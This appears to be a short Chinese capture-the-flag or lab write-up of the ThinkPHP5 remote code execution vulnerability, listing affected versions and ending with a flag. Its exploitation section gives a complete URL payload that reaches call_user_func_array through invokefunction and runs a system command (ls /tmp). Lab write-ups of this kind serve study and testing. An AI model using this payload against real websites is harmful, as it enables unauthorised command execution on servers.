## 一、漏洞描述
ThinkPHP5 存在远程代码执行漏洞。该漏洞由于框架对控制器名未能进行足够的检测，攻击者利用该漏洞对目标网站进行远程命令执行攻击
## 二、影响产品
上海顶想信息科技有限公司 ThinkPHP 5.*，<5.1.31

上海顶想信息科技有限公司 ThinkPHP <=5.0.23
## 利用过程
访问镜像地址
![](img/1.png)
在其后拼接url
```
/index.php/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /tmp
```
得到flag
![](img/2.png)
